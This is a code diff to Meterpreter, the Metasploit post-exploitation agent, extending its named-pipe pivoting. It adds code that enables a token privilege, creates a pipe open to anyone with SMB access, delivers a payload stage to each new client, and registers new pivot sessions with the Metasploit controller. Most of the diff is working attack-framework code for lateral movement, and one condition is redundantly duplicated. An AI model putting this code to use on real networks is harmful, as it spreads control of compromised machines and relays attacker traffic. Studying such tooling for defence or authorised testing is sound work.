@@ -6,7 +6,7 @@
 #include <AclApi.h>
 
 #define PIPE_NAME_SIZE 256
-#define PIPE_BUFFER_SIZE 0x1000
+#define PIPE_BUFFER_SIZE 0x10000
 
 typedef struct _NamedPipeContext
 {
@@ -15,9 +15,6 @@ typedef struct _NamedPipeContext
 	OVERLAPPED read_overlap;
 	OVERLAPPED write_overlap;
 	char       name[PIPE_NAME_SIZE];
-	DWORD      open_mode;
-	DWORD      pipe_mode;
-	DWORD      pipe_count;
 	Remote*    remote;
 	HANDLE     pipe;
 	BOOL       connecting;
@@ -27,6 +24,8 @@ typedef struct _NamedPipeContext
 	DWORD      packet_buffer_size;
 	DWORD      packet_buffer_offset;
 	DWORD      packet_required_size;
+	LPVOID     stage_data;
+	DWORD      stage_data_size;
 } NamedPipeContext;
 
 static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext);
@@ -103,17 +102,18 @@ static DWORD read_pipe_to_packet(NamedPipeContext* ctx, LPBYTE source, DWORD sou
 	return ERROR_SUCCESS;
 }
 
-DWORD named_pipe_write_packet(LPVOID state, LPBYTE rawPacket, DWORD rawPacketLength)
+DWORD named_pipe_write_raw(LPVOID state, LPBYTE raw, DWORD rawLength)
 {
 	NamedPipeContext* ctx = (NamedPipeContext*)state;
 	DWORD dwResult = ERROR_SUCCESS;
 	DWORD bytesWritten = 0;
 
-	dprintf("[NP-SERVER] Writing a total of %u", rawPacketLength);
-	while (bytesWritten < rawPacketLength)
+	dprintf("[NP-SERVER] Writing a total of %u", rawLength);
+	while (bytesWritten < rawLength)
 	{
 		DWORD byteCount = 0;
-		WriteFile(ctx->pipe, rawPacket, rawPacketLength - bytesWritten, NULL, &ctx->write_overlap);
+		WriteFile(ctx->pipe, raw, rawLength - bytesWritten, NULL, &ctx->write_overlap);
+		//WriteFile(ctx->pipe, raw, min(rawLength - bytesWritten, PIPE_BUFFER_SIZE), NULL, &ctx->write_overlap);
 
 		// blocking here is just fine, it's the reads we care about
 		if (GetOverlappedResult(ctx->pipe, &ctx->write_overlap, &byteCount, TRUE))
@@ -125,7 +125,7 @@ DWORD named_pipe_write_packet(LPVOID state, LPBYTE rawPacket, DWORD rawPacketLen
 		{
 			BREAK_ON_ERROR("[NP-SERVER] failed to do the write");
 		}
-		dprintf("[NP-SERVER] left to go: %u", rawPacketLength - bytesWritten);
+		dprintf("[NP-SERVER] left to go: %u", rawLength - bytesWritten);
 	}
 
 	dprintf("[NP SERVER] server write. finished. dwResult=%d, written=%d", dwResult, bytesWritten);
@@ -207,34 +207,73 @@ VOID create_pipe_security_attributes(PSECURITY_ATTRIBUTES psa)
 	psa->lpSecurityDescriptor = sd;
 }
 
+DWORD toggle_privilege(LPCWSTR privName, BOOL enable, BOOL* wasEnabled)
+{
+	HANDLE accessToken;
+	TOKEN_PRIVILEGES tp;
+	TOKEN_PRIVILEGES prevTp;
+	LUID luid;
+	DWORD tpLen;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &accessToken))
+	{
+		dprintf("[NP-PRIV] Couldn't open process token: %u (%x)", GetLastError(), GetLastError());
+		return GetLastError();
+	}
+
+	if (!LookupPrivilegeValueW(NULL, privName, &luid))
+	{
+		dprintf("[NP-PRIV] Couldn't look up the value: %u (%x)", GetLastError(), GetLastError());
+		return GetLastError();
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
+
+	if (!AdjustTokenPrivileges(accessToken, FALSE, &tp, sizeof(tp), &prevTp, &tpLen))
+	{
+		dprintf("[NP-PRIV] Couldn't adjust the token privs: %u (%x)", GetLastError(), GetLastError());
+		return GetLastError();
+	}
+
+	*wasEnabled = (prevTp.Privileges[0].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED ? TRUE : FALSE;
+	dprintf("[NP-PRIV] the %S token was %senabled, and is now %s", privName, *wasEnabled ? "" : "not ", enable ? "enabled" : "disabled");
+
+	CloseHandle(accessToken);
+
+	return ERROR_SUCCESS;
+}
+
 DWORD create_pipe_server_instance(NamedPipeContext* ctx)
 {
 	DWORD dwResult = ERROR_SUCCESS;
 
 	do
 	{
-		// we always need overlapped mode
-		ctx->open_mode |= FILE_FLAG_OVERLAPPED;
+		dprintf("[NP-SERVER] Creating new server instance of %s", ctx->name);
 
-		// never allow PIPE_NOWAIT
-		ctx->pipe_mode &= ~PIPE_NOWAIT;
+		BOOL wasEnabled;
+		DWORD toggleResult = toggle_privilege(SE_SECURITY_NAME, TRUE, &wasEnabled);
 
-		// set a sane value for the count
-		if (ctx->pipe_count == 0)
+		if (toggleResult == ERROR_SUCCESS)
 		{
-			ctx->pipe_count = PIPE_UNLIMITED_INSTANCES;
+			// set up a session that let's anyone with SMB access connect
+			SECURITY_ATTRIBUTES sa = { 0 };
+			create_pipe_security_attributes(&sa);
+			ctx->pipe = CreateNamedPipeA(ctx->name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE, 0, &sa);
+
+			if (wasEnabled == FALSE)
+			{
+				toggle_privilege(SE_SECURITY_NAME, FALSE, &wasEnabled);
+			}
 		}
 
-		dprintf("[NP-SERVER] Creating new server instance of %s", ctx->name);
-		dprintf("[NP-SERVER]   - open mode: 0x%x", ctx->open_mode);
-		dprintf("[NP-SERVER]   - pipe mode: 0x%x", ctx->pipe_mode);
-		dprintf("[NP-SERVER]   - pipe cnt : %d", ctx->pipe_count ? ctx->pipe_count : PIPE_UNLIMITED_INSTANCES);
-
-		// set up a session that let's anyone with SMB access connect
-		SECURITY_ATTRIBUTES sa = { 0 };
-		create_pipe_security_attributes(&sa);
-
-		ctx->pipe = CreateNamedPipeA(ctx->name, ctx->open_mode, ctx->pipe_mode, ctx->pipe_count ? ctx->pipe_count : PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE, 0, &sa);
+		if (ctx->pipe == INVALID_HANDLE_VALUE)
+		{
+			// Fallback on a pipe with simpler security attributes
+			ctx->pipe = CreateNamedPipeA(ctx->name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE, 0, NULL);
+		}
 
 		if (ctx->pipe == INVALID_HANDLE_VALUE)
 		{
@@ -279,10 +318,10 @@ static VOID free_server_context(NamedPipeContext* ctx)
 		dprintf("[NP-SERVER] free_server_context. ctx=0x%08X", ctx);
 
 		dprintf("[NP-SERVER] freeing up pipe handle 0x%x", ctx->pipe);
-		if (ctx->pipe != NULL && ctx->pipe != INVALID_HANDLE_VALUE)
+		if (ctx->pipe != INVALID_HANDLE_VALUE && ctx->pipe != INVALID_HANDLE_VALUE)
 		{
 			CloseHandle(ctx->pipe);
-			ctx->pipe = NULL;
+			ctx->pipe = INVALID_HANDLE_VALUE;
 		}
 
 		if (ctx->read_overlap.hEvent != NULL)
@@ -326,7 +365,7 @@ static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadCon
 			BREAK_WITH_ERROR("[NP-SERVER] server_notify. serverCtx == NULL", ERROR_INVALID_HANDLE);
 		}
 
-		if (serverCtx->pipe == NULL || serverCtx->pipe == INVALID_HANDLE_VALUE)
+		if (serverCtx->pipe == INVALID_HANDLE_VALUE)
 		{
 			BREAK_WITH_ERROR("[NP-SERVER] pipe isn't present, we might be shutting down.", ERROR_INVALID_HANDLE);
 		}
@@ -372,6 +411,7 @@ static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadCon
 			{
 				dprintf("[NP-SERVER] the client appears to have bailed out, disconnecting...");
 				ResetEvent(serverCtx->read_overlap.hEvent);
+				// TODO: do some clean up of stuf here.
 				return ERROR_BROKEN_PIPE;
 			}
 			break;
@@ -384,12 +424,6 @@ static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadCon
 		{
 			// this is a connect, so tell MSF about it.
 			dprintf("[NP-SERVER] This appears to be a new connection, setting up context.");
-			// TODO: when connected, we need to inform
-			//request = packet_create(PACKET_TLV_TYPE_REQUEST, "named_pipe_channel_open");
-			//if (!request)
-			//{
-			//	BREAK_WITH_ERROR("[NP-SERVER] request_net_tcp_server_channel_open. packet_create failed", ERROR_INVALID_HANDLE);
-			//}
 
 			// Connection received, here we're going to create a new named pipe handle so that
 			// other connections can come in on it. We'll assume that it if worked once, it
@@ -397,10 +431,10 @@ static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadCon
 			NamedPipeContext* nextCtx = (NamedPipeContext*)calloc(1, sizeof(NamedPipeContext));
 
 			// copy the relevant content over.
-			nextCtx->open_mode = serverCtx->open_mode;
-			nextCtx->pipe_mode = serverCtx->pipe_mode;
-			nextCtx->pipe_count = serverCtx->pipe_count;
+			nextCtx->pipe = INVALID_HANDLE_VALUE;
 			nextCtx->remote = serverCtx->remote;
+			nextCtx->stage_data = serverCtx->stage_data;
+			nextCtx->stage_data_size = serverCtx->stage_data_size;
 			memcpy_s(&nextCtx->name, PIPE_NAME_SIZE, &serverCtx->name, PIPE_NAME_SIZE);
 
 			// create a new pipe for the next connection
@@ -411,9 +445,35 @@ static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadCon
 				free_server_context(nextCtx);
 			}
 
-			//dwResult = packet_transmit(serverCtx->remote, request, NULL);
-
 			serverCtx->established = TRUE;
+
+			// Time to stage the data
+			if (serverCtx->stage_data && serverCtx->stage_data_size > 0)
+			{
+				dprintf("[NP-SERVER] Sending stage on new connection");
+				// send the stage length
+				named_pipe_write_raw(serverCtx, (LPBYTE)&serverCtx->stage_data_size, sizeof(serverCtx->stage_data_size));
+
+				// send the stage
+				named_pipe_write_raw(serverCtx, serverCtx->stage_data, serverCtx->stage_data_size);
+			}
+
+			// We need to generate a new session GUID and inform metasploit of the new session
+			GUID guid;
+			CoCreateGuid(&guid);
+			// swizzle the values around so that endianness isn't an issue before casting to a block of bytes
+			guid.Data1 = htonl(guid.Data1);
+			guid.Data2 = htons(guid.Data2);
+			guid.Data3 = htons(guid.Data3);
+
+			Packet* notification = packet_create(PACKET_TLV_TYPE_REQUEST, "core_pivot_new");
+			packet_add_tlv_raw(notification, TLV_TYPE_SESSION_GUID, (LPVOID)&guid, sizeof(GUID));
+			packet_transmit(serverCtx->remote, notification, NULL);
+
+			PivotContext* pivotContext = (PivotContext*)calloc(1, sizeof(PivotContext));
+			pivotContext->state = serverCtx;
+			pivotContext->packet_write = named_pipe_write_raw;
+			pivot_tree_add(serverCtx->remote->pivots, (LPBYTE)&guid, pivotContext);
 		}
 
 		if (bytesProcessed > 0)
@@ -477,8 +537,7 @@ DWORD request_core_pivot_add_named_pipe(Remote* remote, Packet* packet)
 
 		ctx->remote = remote;
 
-		//namedPipeName = packet_get_tlv_value_string(packet, TLV_TYPE_NAMED_PIPE_NAME);
-		namedPipeName = "msf-pipe";
+		namedPipeName = packet_get_tlv_value_string(packet, TLV_TYPE_PIVOT_NAMED_PIPE_NAME);
 		if (!namedPipeName)
 		{
 			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName == NULL", ERROR_INVALID_PARAMETER);
@@ -495,9 +554,18 @@ DWORD request_core_pivot_add_named_pipe(Remote* remote, Packet* packet)
 			namedPipeServer = ".";
 		}
 
-		// Both of these can be zero, let's hope that the user doesn't forget to set them if required!
-		ctx->open_mode = PIPE_ACCESS_DUPLEX;
-		ctx->pipe_mode = 0;
+		LPVOID stageData = packet_get_tlv_value_raw(packet, TLV_TYPE_PIVOT_STAGE_DATA);
+		ctx->stage_data_size = packet_get_tlv_value_uint(packet, TLV_TYPE_PIVOT_STAGE_DATA_SIZE);
+
+		if (stageData && ctx->stage_data_size > 0)
+		{
+			dprintf("[NP-SEVER] stage received, size is %u (%x)", ctx->stage_data_size, ctx->stage_data_size);
+			ctx->stage_data = (LPVOID)malloc(ctx->stage_data_size);
+			memcpy(ctx->stage_data, stageData, ctx->stage_data_size);
+		}
+
+		// Default to invalid handle.
+		ctx->pipe = INVALID_HANDLE_VALUE;
 
 		_snprintf_s(ctx->name, PIPE_NAME_SIZE, PIPE_NAME_SIZE - 1, "\\\\%s\\pipe\\%s", namedPipeServer, namedPipeName);
 
